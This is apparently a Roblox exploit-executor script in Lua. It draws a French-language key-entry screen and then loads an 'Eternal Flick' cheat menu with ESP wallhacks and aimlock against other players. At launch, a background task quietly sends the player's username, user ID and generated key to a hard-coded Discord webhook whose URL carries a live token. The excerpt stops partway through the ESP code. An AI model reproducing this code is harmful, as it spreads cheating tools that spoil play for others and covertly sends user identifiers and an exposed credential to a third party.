local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1528559512930484465/22ktjoToYw-EzFKQ27U4wKKBAkOrLq6ETNe5XrjSzF3Rr_42EJFTMMawE8zvLCD4C2mo"

local function toBase64(data)
    local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    return ((data:gsub('.', function(x)
        local r,b2='',x:byte()
        for i=8,1,-1 do r=r..(b2%2^i-b2%2^(i-1)>0 and '1' or '0') end
        return r;
    end)..'0000'):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end):gsub('.', function(x)
        local r,b2='',x:byte()
        for i=8,1,-1 do r=r..(b2%2^i-b2%2^(i-1)>0 and '1' or '0') end
        return r
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(math.floor(c/64)+1) .. string.char(c%64+1)
    end):gsub('[%s%S]', function(c)
        return b:sub(c:byte()-63, c:byte()-63)
    end))
end

local function generateKey()
    local randomStr = ""
    local chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    for i = 1, 16 do
        randomStr = randomStr .. string.char(chars:byte(math.random(1, #chars)))
    end
    return toBase64(randomStr)
end

local VALID_KEY = generateKey()

task.spawn(function()
    local requestFunc = (syn and syn.request) or (http_request) or (fluxus and fluxus.request) or (request)
    if requestFunc then
        local payload = {
            ["content"] = "**Nouvelle demande de clé !**\n**Joueur :** " .. LocalPlayer.Name .. "\n**ID (@) :** " .. LocalPlayer.UserId .. "\n**Clé générée :** `" .. VALID_KEY .. "`"
        }
        pcall(function()
            requestFunc({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = HttpService:JSONEncode(payload)
            })
        end)
    end
end)

local parentTarget = (syn and syn.protect_gui and syn.protect_gui(gethui and gethui() or CoreGui)) or CoreGui

local KeyGui = Instance.new("ScreenGui")
KeyGui.Name = "NebulaKeySystem"
KeyGui.ResetOnSpawn = false
KeyGui.IgnoreGuiInset = true
KeyGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
KeyGui.Parent = parentTarget

local BlurEffect = Instance.new("BlurEffect")
BlurEffect.Size = 0
BlurEffect.Parent = game:GetService("Lighting")

TweenService:Create(BlurEffect, TweenInfo.new(0.4, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Size = 15}):Play()

local Background = Instance.new("Frame")
Background.Size = UDim2.new(1, 0, 1, 0)
Background.BackgroundColor3 = Color3.fromRGB(10, 10, 15)
Background.BackgroundTransparency = 0.4
Background.BorderSizePixel = 0
Background.Parent = KeyGui

local MainKeyFrame = Instance.new("Frame")
MainKeyFrame.Size = UDim2.new(0, 380, 0, 220)
MainKeyFrame.Position = UDim2.new(0.5, -190, 0.5, -110)
MainKeyFrame.BackgroundColor3 = Color3.fromRGB(18, 18, 26)
MainKeyFrame.BorderSizePixel = 0
MainKeyFrame.Parent = Background

local MainKeyCorner = Instance.new("UICorner")
MainKeyCorner.CornerRadius = UDim.new(0, 10)
MainKeyCorner.Parent = MainKeyFrame

local MainKeyStroke = Instance.new("UIStroke")
MainKeyStroke.Color = Color3.fromRGB(60, 160, 255)
MainKeyStroke.Transparency = 0.8
MainKeyStroke.Thickness = 1.2
MainKeyStroke.Parent = MainKeyFrame

local AccentBar = Instance.new("Frame")
AccentBar.Size = UDim2.new(1, 0, 0, 3)
AccentBar.BackgroundColor3 = Color3.fromRGB(60, 160, 255)
AccentBar.BorderSizePixel = 0
AccentBar.Parent = MainKeyFrame

local TitleLabel = Instance.new("TextLabel")
TitleLabel.Size = UDim2.new(1, 0, 0, 50)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text = "NEBULA KEY SYSTEM"
TitleLabel.TextColor3 = Color3.fromRGB(240, 240, 248)
TitleLabel.Font = Enum.Font.GothamBold
TitleLabel.TextSize = 18
TitleLabel.Parent = MainKeyFrame

local SubTitle = Instance.new("TextLabel")
SubTitle.Size = UDim2.new(1, 0, 0, 20)
SubTitle.Position = UDim2.new(0, 0, 0, 45)
SubTitle.BackgroundTransparency = 1
SubTitle.Text = "Clé envoyée, entrez-la ci-dessous."
SubTitle.TextColor3 = Color3.fromRGB(120, 120, 132)
SubTitle.Font = Enum.Font.GothamMedium
SubTitle.TextSize = 12
SubTitle.Parent = MainKeyFrame

local KeyInput = Instance.new("TextBox")
KeyInput.Size = UDim2.new(0, 340, 0, 42)
KeyInput.Position = UDim2.new(0.5, -170, 0, 85)
KeyInput.BackgroundColor3 = Color3.fromRGB(14, 14, 19)
KeyInput.BorderSizePixel = 0
KeyInput.PlaceholderText = "Entrez la clé ici..."
KeyInput.Text = ""
KeyInput.TextColor3 = Color3.fromRGB(210, 210, 222)
KeyInput.Font = Enum.Font.Code
KeyInput.TextSize = 14
KeyInput.Parent = MainKeyFrame

local KeyInputCorner = Instance.new("UICorner")
KeyInputCorner.CornerRadius = UDim.new(0, 6)
KeyInputCorner.Parent = KeyInput

local KeyInputStroke = Instance.new("UIStroke")
KeyInputStroke.Color = Color3.fromRGB(40, 40, 50)
KeyInputStroke.Thickness = 1
KeyInputStroke.Parent = KeyInput

local SubmitButton = Instance.new("TextButton")
SubmitButton.Size = UDim2.new(0, 340, 0, 42)
SubmitButton.Position = UDim2.new(0.5, -170, 0, 140)
SubmitButton.BackgroundColor3 = Color3.fromRGB(60, 160, 255)
SubmitButton.BorderSizePixel = 0
SubmitButton.Text = "VALIDER"
SubmitButton.TextColor3 = Color3.fromRGB(255, 255, 255)
SubmitButton.Font = Enum.Font.GothamBold
SubmitButton.TextSize = 14
SubmitButton.Parent = MainKeyFrame

local SubmitCorner = Instance.new("UICorner")
SubmitCorner.CornerRadius = UDim.new(0, 6)
SubmitCorner.Parent = SubmitButton

local ErrorLabel = Instance.new("TextLabel")
ErrorLabel.Size = UDim2.new(1, 0, 0, 20)
ErrorLabel.Position = UDim2.new(0, 0, 1, -25)
ErrorLabel.BackgroundTransparency = 1
ErrorLabel.Text = ""
ErrorLabel.TextColor3 = Color3.fromRGB(255, 80, 80)
ErrorLabel.Font = Enum.Font.GothamMedium
ErrorLabel.TextSize = 12
ErrorLabel.Parent = MainKeyFrame

local function ShakeFrame()
    local origPos = MainKeyFrame.Position
    TweenService:Create(MainKeyFrame, TweenInfo.new(0.05, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Position = UDim2.new(0.5, -180, 0.5, -110)}):Play()
    task.wait(0.05)
    TweenService:Create(MainKeyFrame, TweenInfo.new(0.05, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Position = UDim2.new(0.5, -200, 0.5, -110)}):Play()
    task.wait(0.05)
    TweenService:Create(MainKeyFrame, TweenInfo.new(0.05, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Position = UDim2.new(0.5, -190, 0.5, -110)}):Play()
    task.wait(0.05)
    TweenService:Create(MainKeyFrame, TweenInfo.new(0.05, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Position = origPos}):Play()
end

local function CheckKey()
    local enteredKey = KeyInput.Text
    if enteredKey == VALID_KEY then
        ErrorLabel.Text = "Clé correcte ! Chargement du menu..."
        ErrorLabel.TextColor3 = Color3.fromRGB(80, 200, 120)
        
        TweenService:Create(BlurEffect, TweenInfo.new(0.5, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Size = 0}):Play()
        TweenService:Create(Background, TweenInfo.new(0.5, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {BackgroundTransparency = 1}):Play()
        TweenService:Create(MainKeyFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quart, Enum.EasingDirection.In), {Position = UDim2.new(0.5, -190, 0.5, -500)}):Play()
        
        task.wait(0.6)
        KeyGui:Destroy()
        BlurEffect:Destroy()

        local Nebula = {
            Version = "7.8",
            Open = true,
            TeleportPoints = {}
        }

        local TweenService = game:GetService("TweenService")
        local UserInputService = game:GetService("UserInputService")
        local RunService = game:GetService("RunService")
        local Players = game:GetService("Players")
        local HttpService = game:GetService("HttpService")
        local TeleportService = game:GetService("TeleportService")
        local ProximityPromptService = game:GetService("ProximityPromptService")
        local LocalPlayer = Players.LocalPlayer
        local Camera = workspace.CurrentCamera
        local Lighting = game:GetService("Lighting")

        local flick_script = [[
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")

local LocalPlayer = Players.LocalPlayer
local ESP_Enabled = false
local ESPDistance_Enabled = false
local Aimlock_Enabled = false
local ESP_Objects = {}
local ESP_Connections = {}
local FOV_RADIUS = 150
local fovCircle = nil
local fovCrosshair = nil
local draggingSlider = false
local camera = workspace.CurrentCamera
local aimlockConnection = nil
local AimlockKey = Enum.KeyCode.E
local waitingForKey = false
local isMouseButton = false
local guiVisible = true
local fovCircleVisible = false

local Whitelist = {}
local WhitelistDropdownOpen = false
local WhitelistDropdown = nil

local dragging = false
local dragStartPos = nil
local frameStartPos = nil

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "EternalFlick_GUI"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = game:GetService("CoreGui")

local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 480, 0, 420)
MainFrame.Position = UDim2.new(0.5, -240, 0.5, -210)
MainFrame.BackgroundColor3 = Color3.fromRGB(18, 18, 26)
MainFrame.BorderSizePixel = 0
MainFrame.Active = true
MainFrame.Parent = ScreenGui

local TitleBar = Instance.new("Frame")
TitleBar.Size = UDim2.new(1, 0, 0, 30)
TitleBar.Position = UDim2.new(0, 0, 0, 0)
TitleBar.BackgroundTransparency = 1
TitleBar.BorderSizePixel = 0
TitleBar.Parent = MainFrame

local AccentBar = Instance.new("Frame")
AccentBar.Size = UDim2.new(1, 0, 0, 2)
AccentBar.Position = UDim2.new(0, 0, 0, 0)
AccentBar.BackgroundColor3 = Color3.fromRGB(60, 160, 255)
AccentBar.BorderSizePixel = 0
AccentBar.Parent = TitleBar

local Sidebar = Instance.new("Frame")
Sidebar.Size = UDim2.new(0, 110, 1, -2)
Sidebar.Position = UDim2.new(0, 0, 0, 2)
Sidebar.BackgroundColor3 = Color3.fromRGB(24, 24, 30)
Sidebar.BorderSizePixel = 0
Sidebar.Parent = MainFrame

local SidebarStroke = Instance.new("UIStroke")
SidebarStroke.Color = Color3.fromRGB(30, 30, 40)
SidebarStroke.Thickness = 1
SidebarStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
SidebarStroke.Parent = Sidebar

local SidebarHeader = Instance.new("Frame")
SidebarHeader.Size = UDim2.new(1, 0, 0, 56)
SidebarHeader.Position = UDim2.new(0, 0, 0, 0)
SidebarHeader.BackgroundTransparency = 1
SidebarHeader.BorderSizePixel = 0
SidebarHeader.Parent = Sidebar

local SidebarHeaderSep = Instance.new("Frame")
SidebarHeaderSep.Size = UDim2.new(1, 0, 0, 1)
SidebarHeaderSep.Position = UDim2.new(0, 0, 1, -1)
SidebarHeaderSep.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
SidebarHeaderSep.BorderSizePixel = 0
SidebarHeaderSep.Parent = SidebarHeader

local TitleLine1 = Instance.new("TextLabel")
TitleLine1.Size = UDim2.new(1, -10, 0, 18)
TitleLine1.Position = UDim2.new(0, 10, 0, 10)
TitleLine1.BackgroundTransparency = 1
TitleLine1.Text = "ETERNAL"
TitleLine1.TextColor3 = Color3.fromRGB(60, 160, 255)
TitleLine1.Font = Enum.Font.Code
TitleLine1.TextSize = 13
TitleLine1.TextXAlignment = Enum.TextXAlignment.Left
TitleLine1.Parent = SidebarHeader

local TitleLine2 = Instance.new("TextLabel")
TitleLine2.Size = UDim2.new(1, -10, 0, 16)
TitleLine2.Position = UDim2.new(0, 10, 0, 28)
TitleLine2.BackgroundTransparency = 1
TitleLine2.Text = "FLICK"
TitleLine2.TextColor3 = Color3.fromRGB(60, 160, 255)
TitleLine2.Font = Enum.Font.Code
TitleLine2.TextSize = 13
TitleLine2.TextXAlignment = Enum.TextXAlignment.Left
TitleLine2.Parent = SidebarHeader

local VersionLabel = Instance.new("TextLabel")
VersionLabel.Size = UDim2.new(1, -10, 0, 12)
VersionLabel.Position = UDim2.new(0, 10, 0, 42)
VersionLabel.BackgroundTransparency = 1
VersionLabel.Text = "v2.0"
VersionLabel.TextColor3 = Color3.fromRGB(50, 50, 65)
VersionLabel.Font = Enum.Font.Code
VersionLabel.TextSize = 11
VersionLabel.TextXAlignment = Enum.TextXAlignment.Left
VersionLabel.Parent = SidebarHeader

local AimNavBtn = Instance.new("TextButton")
AimNavBtn.Size = UDim2.new(1, 0, 0, 36)
AimNavBtn.Position = UDim2.new(0, 0, 0, 57)
AimNavBtn.BackgroundColor3 = Color3.fromRGB(60, 160, 255)
AimNavBtn.BackgroundTransparency = 0.88
AimNavBtn.BorderSizePixel = 0
AimNavBtn.Text = "AIM"
AimNavBtn.TextColor3 = Color3.fromRGB(60, 160, 255)
AimNavBtn.Font = Enum.Font.Code
AimNavBtn.TextSize = 12
AimNavBtn.TextXAlignment = Enum.TextXAlignment.Left
AimNavBtn.Parent = Sidebar

local AimNavAccent = Instance.new("Frame")
AimNavAccent.Size = UDim2.new(0, 2, 1, 0)
AimNavAccent.Position = UDim2.new(0, 0, 0, 0)
AimNavAccent.BackgroundColor3 = Color3.fromRGB(60, 160, 255)
AimNavAccent.BorderSizePixel = 0
AimNavAccent.Parent = AimNavBtn

local AimNavPad = Instance.new("UIPadding")
AimNavPad.PaddingLeft = UDim.new(0, 14)
AimNavPad.Parent = AimNavBtn

local VisualNavBtn = Instance.new("TextButton")
VisualNavBtn.Size = UDim2.new(1, 0, 0, 36)
VisualNavBtn.Position = UDim2.new(0, 0, 0, 93)
VisualNavBtn.BackgroundTransparency = 1
VisualNavBtn.BorderSizePixel = 0
VisualNavBtn.Text = "VISUAL"
VisualNavBtn.TextColor3 = Color3.fromRGB(140, 140, 160)
VisualNavBtn.Font = Enum.Font.Code
VisualNavBtn.TextSize = 12
VisualNavBtn.TextXAlignment = Enum.TextXAlignment.Left
VisualNavBtn.Parent = Sidebar

local VisualNavAccent = Instance.new("Frame")
VisualNavAccent.Size = UDim2.new(0, 2, 1, 0)
VisualNavAccent.Position = UDim2.new(0, 0, 0, 0)
VisualNavAccent.BackgroundColor3 = Color3.fromRGB(60, 160, 255)
VisualNavAccent.BorderSizePixel = 0
VisualNavAccent.Visible = false
VisualNavAccent.Parent = VisualNavBtn

local VisualNavPad = Instance.new("UIPadding")
VisualNavPad.PaddingLeft = UDim.new(0, 14)
VisualNavPad.Parent = VisualNavBtn

local WhitelistNavBtn = Instance.new("TextButton")
WhitelistNavBtn.Size = UDim2.new(1, 0, 0, 36)
WhitelistNavBtn.Position = UDim2.new(0, 0, 0, 129)
WhitelistNavBtn.BackgroundTransparency = 1
WhitelistNavBtn.BorderSizePixel = 0
WhitelistNavBtn.Text = "WHITELIST"
WhitelistNavBtn.TextColor3 = Color3.fromRGB(140, 140, 160)
WhitelistNavBtn.Font = Enum.Font.Code
WhitelistNavBtn.TextSize = 12
WhitelistNavBtn.TextXAlignment = Enum.TextXAlignment.Left
WhitelistNavBtn.Parent = Sidebar

local WhitelistNavAccent = Instance.new("Frame")
WhitelistNavAccent.Size = UDim2.new(0, 2, 1, 0)
WhitelistNavAccent.Position = UDim2.new(0, 0, 0, 0)
WhitelistNavAccent.BackgroundColor3 = Color3.fromRGB(60, 160, 255)
WhitelistNavAccent.BorderSizePixel = 0
WhitelistNavAccent.Visible = false
WhitelistNavAccent.Parent = WhitelistNavBtn

local WhitelistNavPad = Instance.new("UIPadding")
WhitelistNavPad.PaddingLeft = UDim.new(0, 14)
WhitelistNavPad.Parent = WhitelistNavBtn

local InsertHint = Instance.new("TextLabel")
InsertHint.Size = UDim2.new(1, -10, 0, 14)
InsertHint.Position = UDim2.new(0, 10, 1, -20)
InsertHint.BackgroundTransparency = 1
InsertHint.Text = "INSERT = show/hide"
InsertHint.TextColor3 = Color3.fromRGB(38, 38, 52)
InsertHint.Font = Enum.Font.Code
InsertHint.TextSize = 10
InsertHint.TextXAlignment = Enum.TextXAlignment.Left
InsertHint.Parent = Sidebar

local ContentArea = Instance.new("Frame")
ContentArea.Size = UDim2.new(1, -118, 1, -2)
ContentArea.Position = UDim2.new(0, 114, 0, 2)
ContentArea.BackgroundTransparency = 1
ContentArea.Parent = MainFrame

local AimPanel = Instance.new("ScrollingFrame")
AimPanel.Size = UDim2.new(1, 0, 1, -30)
AimPanel.Position = UDim2.new(0, 0, 0, 0)
AimPanel.BackgroundTransparency = 1
AimPanel.BorderSizePixel = 0
AimPanel.ScrollBarThickness = 3
AimPanel.ScrollBarImageColor3 = Color3.fromRGB(60, 60, 80)
AimPanel.AutomaticCanvasSize = Enum.AutomaticSize.Y
AimPanel.Visible = true
AimPanel.Parent = ContentArea

local AimPanelLayout = Instance.new("UIListLayout")
AimPanelLayout.Padding = UDim.new(0, 0)
AimPanelLayout.SortOrder = Enum.SortOrder.LayoutOrder
AimPanelLayout.Parent = AimPanel

local AimPanelPad = Instance.new("UIPadding")
AimPanelPad.PaddingTop = UDim.new(0, 12)
AimPanelPad.PaddingLeft = UDim.new(0, 12)
AimPanelPad.PaddingRight = UDim.new(0, 12)
AimPanelPad.Parent = AimPanel

local VisualPanel = Instance.new("ScrollingFrame")
VisualPanel.Size = UDim2.new(1, 0, 1, -30)
VisualPanel.Position = UDim2.new(0, 0, 0, 0)
VisualPanel.BackgroundTransparency = 1
VisualPanel.BorderSizePixel = 0
VisualPanel.ScrollBarThickness = 3
VisualPanel.ScrollBarImageColor3 = Color3.fromRGB(60, 60, 80)
VisualPanel.AutomaticCanvasSize = Enum.AutomaticSize.Y
VisualPanel.Visible = false
VisualPanel.Parent = ContentArea

local VisualPanelLayout = Instance.new("UIListLayout")
VisualPanelLayout.Padding = UDim.new(0, 0)
VisualPanelLayout.SortOrder = Enum.SortOrder.LayoutOrder
VisualPanelLayout.Parent = VisualPanel

local VisualPanelPad = Instance.new("UIPadding")
VisualPanelPad.PaddingTop = UDim.new(0, 12)
VisualPanelPad.PaddingLeft = UDim.new(0, 12)
VisualPanelPad.PaddingRight = UDim.new(0, 12)
VisualPanelPad.Parent = VisualPanel

local WhitelistPanel = Instance.new("ScrollingFrame")
WhitelistPanel.Size = UDim2.new(1, 0, 1, -30)
WhitelistPanel.Position = UDim2.new(0, 0, 0, 0)
WhitelistPanel.BackgroundTransparency = 1
WhitelistPanel.BorderSizePixel = 0
WhitelistPanel.ScrollBarThickness = 3
WhitelistPanel.ScrollBarImageColor3 = Color3.fromRGB(60, 60, 80)
WhitelistPanel.AutomaticCanvasSize = Enum.AutomaticSize.Y
WhitelistPanel.Visible = false
WhitelistPanel.Parent = ContentArea

local WhitelistPanelLayout = Instance.new("UIListLayout")
WhitelistPanelLayout.Padding = UDim.new(0, 0)
WhitelistPanelLayout.SortOrder = Enum.SortOrder.LayoutOrder
WhitelistPanelLayout.Parent = WhitelistPanel

local WhitelistPanelPad = Instance.new("UIPadding")
WhitelistPanelPad.PaddingTop = UDim.new(0, 12)
WhitelistPanelPad.PaddingLeft = UDim.new(0, 12)
WhitelistPanelPad.PaddingRight = UDim.new(0, 12)
WhitelistPanelPad.Parent = WhitelistPanel

local Footer = Instance.new("Frame")
Footer.Size = UDim2.new(1, 0, 0, 28)
Footer.Position = UDim2.new(0, 0, 0, 1)
Footer.BackgroundColor3 = Color3.fromRGB(20, 20, 28)
Footer.BorderSizePixel = 0
Footer.Parent = MainFrame

local FooterSep = Instance.new("Frame")
FooterSep.Size = UDim2.new(1, 0, 0, 1)
FooterSep.Position = UDim2.new(0, 0, 0, 0)
FooterSep.BackgroundColor3 = Color3.fromRGB(28, 28, 40)
FooterSep.BorderSizePixel = 0
FooterSep.Parent = Footer

local FooterDot = Instance.new("Frame")
FooterDot.Size = UDim2.new(0, 6, 0, 6)
FooterDot.Position = UDim2.new(0, 10, 0.5, -3)
FooterDot.BackgroundColor3 = Color3.fromRGB(60, 160, 255)
FooterDot.BorderSizePixel = 0
FooterDot.Parent = Footer
local FooterDotCorner = Instance.new("UICorner")
FooterDotCorner.CornerRadius = UDim.new(1, 0)
FooterDotCorner.Parent = FooterDot

local FooterLabel = Instance.new("TextLabel")
FooterLabel.Size = UDim2.new(0, 160, 1, 0)
FooterLabel.Position = UDim2.new(0, 22, 0, 0)
FooterLabel.BackgroundTransparency = 1
FooterLabel.Text = "ETERNAL FLICK"
FooterLabel.TextColor3 = Color3.fromRGB(60, 160, 255)
FooterLabel.Font = Enum.Font.Code
FooterLabel.TextSize = 11
FooterLabel.TextXAlignment = Enum.TextXAlignment.Left
FooterLabel.Parent = Footer

local function createSectionLabel(parent, text, order)
    local lbl = Instance.new("TextLabel")
    lbl.Size = UDim2.new(1, 0, 0, 28)
    lbl.BackgroundTransparency = 1
    lbl.Text = text:upper()
    lbl.TextColor3 = Color3.fromRGB(60, 160, 255)
    lbl.Font = Enum.Font.Code
    lbl.TextSize = 12
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.LayoutOrder = order or 0
    lbl.Parent = parent
    return lbl
end

local function createRow(parent, order)
    local row = Instance.new("Frame")
    row.Size = UDim2.new(1, 0, 0, 40)
    row.BackgroundTransparency = 1
    row.LayoutOrder = order or 0
    row.Parent = parent
    local sep = Instance.new("Frame")
    sep.Size = UDim2.new(1, 0, 0, 1)
    sep.Position = UDim2.new(0, 0, 1, -1)
    sep.BackgroundColor3 = Color3.fromRGB(26, 26, 36)
    sep.BorderSizePixel = 0
    sep.Parent = row
    return row
end

local function addRowLabel(row, text, subtext)
    local lbl = Instance.new("TextLabel")
    lbl.Size = UDim2.new(0.6, 0, 0, 18)
    lbl.Position = UDim2.new(0, 0, 0, 6)
    lbl.BackgroundTransparency = 1
    lbl.Text = text
    lbl.TextColor3 = Color3.fromRGB(210, 210, 220)
    lbl.Font = Enum.Font.Code
    lbl.TextSize = 12
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.Parent = row
    if subtext then
        local sub = Instance.new("TextLabel")
        sub.Size = UDim2.new(0.6, 0, 0, 13)
        sub.Position = UDim2.new(0, 0, 0, 24)
        sub.BackgroundTransparency = 1
        sub.Text = subtext
        sub.TextColor3 = Color3.fromRGB(55, 55, 70)
        sub.Font = Enum.Font.Code
        sub.TextSize = 10
        sub.TextXAlignment = Enum.TextXAlignment.Left
        sub.Parent = row
    end
end

local function createToggleInRow(row)
    local track = Instance.new("Frame")
    track.Size = UDim2.new(0, 42, 0, 22)
    track.Position = UDim2.new(1, -42, 0.5, -11)
    track.BackgroundColor3 = Color3.fromRGB(55, 55, 65)
    track.BorderSizePixel = 0
    track.Parent = row
    local tc = Instance.new("UICorner")
    tc.CornerRadius = UDim.new(0, 11)
    tc.Parent = track
    local thumb = Instance.new("Frame")
    thumb.Size = UDim2.new(0, 18, 0, 18)
    thumb.Position = UDim2.new(0, 2, 0.5, -9)
    thumb.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    thumb.BorderSizePixel = 0
    thumb.Parent = track
    local thc = Instance.new("UICorner")
    thc.CornerRadius = UDim.new(1, 0)
    thc.Parent = thumb
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 1, 0)
    btn.BackgroundTransparency = 1
    btn.Text = ""
    btn.Parent = track
    return track, thumb, btn
end

local function AnimateToggle(track, thumb, enabled)
    if not track or not thumb then return end
    local thumbPos = enabled and UDim2.new(0, 22, 0.5, -9) or UDim2.new(0, 2, 0.5, -9)
    local trackColor = enabled and Color3.fromRGB(60, 160, 255) or Color3.fromRGB(55, 55, 65)
    TweenService:Create(thumb, TweenInfo.new(0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position = thumbPos}):Play()
    TweenService:Create(track, TweenInfo.new(0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = trackColor}):Play()
end

local function startDrag(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStartPos = Vector2.new(input.Position.X, input.Position.Y)
        frameStartPos = MainFrame.Position
    end
end

local function onDrag(input)
    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
        local delta = Vector2.new(input.Position.X, input.Position.Y) - dragStartPos
        local newX = frameStartPos.X.Offset + delta.X
        local newY = frameStartPos.Y.Offset + delta.Y
        MainFrame.Position = UDim2.new(frameStartPos.X.Scale, newX, frameStartPos.Y.Scale, newY)
    end
end

local function stopDrag(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
    end
end

TitleBar.InputBegan:Connect(startDrag)
UserInputService.InputChanged:Connect(onDrag)
UserInputService.InputEnded:Connect(stopDrag)

local function IsPlayerVisible(targetCharacter)
    if not LocalPlayer.Character then return false end
    local localRoot = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    local targetRoot = targetCharacter:FindFirstChild("HumanoidRootPart")
    local targetHead = targetCharacter:FindFirstChild("Head")
    if not localRoot or not targetRoot then return false end
    local targetPart = targetHead or targetRoot
    local raycastParams = RaycastParams.new()
    raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
    raycastParams.FilterDescendantsInstances = {LocalPlayer.Character, targetCharacter}
    local raycastResult = workspace:Raycast(localRoot.Position, (targetPart.Position - localRoot.Position), raycastParams)
    return raycastResult == nil
end

local function GetDistance(player)
    if not LocalPlayer.Character or not player.Character then return nil end
    local localRoot = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    local targetRoot = player.Character:FindFirstChild("HumanoidRootPart")
    if not localRoot or not targetRoot then return nil end
    return math.floor((localRoot.Position - targetRoot.Position).Magnitude)
end

local function IsInFOV(player)
    if not player.Character or not camera then return false end
    local head = player.Character:FindFirstChild("Head")
    if not head then return false end
    local mouseLoc = UserInputService:GetMouseLocation()
    local screenPos, onScreen = camera:WorldToViewportPoint(head.Position)
    if onScreen and screenPos.Z > 0 then
        local dx = screenPos.X - mouseLoc.X
        local dy = screenPos.Y - mouseLoc.Y
        local dist = math.sqrt(dx*dx + dy*dy)
        return dist <= FOV_RADIUS
    end
    return false
end

local function IsWhitelisted(player)
    for _, wl in ipairs(Whitelist) do
        if wl == player then return true end
    end
    return false
end

local function UpdateESPColor(highlight, isVisible, isInFOV, isWhitelisted)
    if isWhitelisted then
        highlight.FillColor = Color3.fromRGB(220, 220, 255)
        highlight.OutlineColor = Color3.fromRGB(180, 180, 220)
        highlight.FillTransparency = 0.2
        highlight.OutlineTransparency = 0.05
    elseif isVisible and isInFOV then
        highlight.FillColor = Color3.fromRGB(0, 200, 50)
        highlight.OutlineColor = Color3.fromRGB(0, 150, 30)
        highlight.FillTransparency = 0.25
        highlight.OutlineTransparency = 0.05
    elseif isVisible then
        highlight.FillColor = Color3.fromRGB(20, 50, 200)
        highlight.OutlineColor = Color3.fromRGB(15, 40, 160)
        highlight.FillTransparency = 0.3
        highlight.OutlineTransparency = 0.1
    else
        highlight.FillColor = Color3.fromRGB(180, 30, 30)
        highlight.OutlineColor = Color3.fromRGB(140, 20, 20)
        highlight.FillTransparency = 0.35
        highlight.OutlineTransparency = 0.15
    end
end

local function UpdateNameColor(nameText, distanceText, isVisible, isInFOV, isWhitelisted)
    local col
    if isWhitelisted then
        col = Color3.fromRGB(255, 255, 255)
    elseif isVisible and isInFOV then
        col = Color3.fromRGB(0, 220, 80)
    elseif isVisible then
        col = Color3.fromRGB(20, 100, 220)
    else
        col = Color3.fromRGB(200, 40, 40)
    end
    nameText.TextColor3 = col
    if distanceText then distanceText.TextColor3 = col end
end

local ESPTrack, ESPThumb, ESPBtn = nil, nil, nil
local ESPDistTrack, ESPDistThumb, ESPDistBtn = nil, nil, nil
local FOVCircleTrack, FOVCircleThumb, FOVCircleBtn = nil, nil, nil

local function RefreshESP()
    if ESP_Enabled then
        for player, data in pairs(ESP_Objects) do
            if data and data.Billboard and data.Billboard.Parent then
                if data.DistanceFrame then
                    data.DistanceFrame.Visible = ESPDistance_Enabled
                end
            end
        end
    end
end

local function CreateESP(player)
    if player == LocalPlayer then return end
    if ESP_Objects[player] then return end
    
    local function OnCharacterAdded(character)
        if not ESP_Enabled or not character or not character.Parent then return end
        
        local humanoid, rootPart, head
        for i = 1, 10 do
            humanoid = character:FindFirstChild("Humanoid")
            rootPart = character:FindFirstChild("HumanoidRootPart")
            head = character:FindFirstChild("Head")
            if humanoid and rootPart then break end
            task.wait(0.1)
        end
        if not humanoid or not rootPart then return end
        
        local highlight = Instance.new("Highlight")
        highlight.Name = "ESP_Highlight"
        highlight.FillColor = Color3.fromRGB(180, 30, 30)
        highlight.OutlineColor = Color3.fromRGB(140, 20, 20)
        highlight.FillTransparency = 0.35
        highlight.OutlineTransparency = 0.15
        highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
        highlight.Adornee = character
        highlight.Parent = character

        local billboardGui = Instance.new("BillboardGui")
        billboardGui.Name = "ESP_NameTag"
        billboardGui.Size = UDim2.new(0, 180, 0, 28)
        billboardGui.StudsOffset = Vector3.new(0, 2.2, 0)
        billboardGui.AlwaysOnTop = true
